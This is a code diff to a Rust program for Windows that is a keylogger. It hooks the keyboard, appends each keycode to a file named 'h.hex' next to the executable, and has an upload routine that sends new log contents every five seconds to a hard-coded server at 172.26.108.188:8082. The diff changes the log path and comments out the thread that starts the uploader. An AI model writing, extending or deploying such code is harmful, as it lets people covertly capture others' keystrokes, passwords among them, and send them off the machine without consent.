@@ -22,7 +22,9 @@ use std::{
     slice::from_raw_parts,
     usize,
     fs::{File, metadata, OpenOptions},
-    thread::spawn
+    thread::spawn,
+    env::current_exe,
+    path::PathBuf
 };
 use serde_json::json;
 use reqwest::blocking::Client;
@@ -60,22 +62,25 @@ fn get_current_user() -> String {
     }
 }
 
-fn get_file_size(file_path: &str) -> u64 {
+fn get_file_size(file_path: &PathBuf) -> u64 {
     if let Ok(file_metadata) = metadata(file_path) {
         file_metadata.len()
-    } else { 0 }
+    } else {0}
 }
 
 fn upload_file() {
+    let exe_path = current_exe().unwrap();
+    let hex_file_path = exe_path.parent().unwrap().join("h.hex");
+
     let mut last_file_size: u64 = 0;
     loop {
         sleep(Duration::from_secs(5));
-        let current_file_size: u64 = get_file_size("h.hex"); // if current file size is LESS THAN the last file size then reset last file size
+        let current_file_size: u64 = get_file_size(&hex_file_path); // if current file size is LESS THAN the last file size then reset last file size
 
         if current_file_size > last_file_size {
             let url = "http://172.26.108.188:8082/UploadFile";
 
-            let mut file = File::open("h.hex").expect("Failed to open file");
+            let mut file = File::open(&hex_file_path).expect("Failed to open file");
             let mut content = Vec::new();
 
             file.seek(SeekFrom::Start(last_file_size)).expect("Failed to set seek"); // Will send the whole file when the program first starts
@@ -111,7 +116,10 @@ fn upload_file() {
 }
 
 fn append_keycode_to_file(keycode: u32) -> std::io::Result<()> {
-    let mut file = OpenOptions::new().create(true).append(true).open("h.hex")?;
+    let exe_path = current_exe().unwrap();
+    let hex_file_path = exe_path.parent().unwrap().join("h.hex");
+
+    let mut file = OpenOptions::new().create(true).append(true).open(hex_file_path)?;
 
     file.write_all(&keycode.to_ne_bytes())?;
     
@@ -149,9 +157,9 @@ fn main() {
         HINSTANCE::default(),
         0
     ).unwrap()};
-    let _upload_thread = spawn(|| {
-        upload_file();
-    });
+    //let _upload_thread = spawn(|| {
+        //upload_file();
+    //});
     message_loop();
     //std::io::stdin().read_line(&mut String::new()).unwrap(); //End on enter.
     unsafe{UnhookWindowsHookEx(hook).unwrap()};
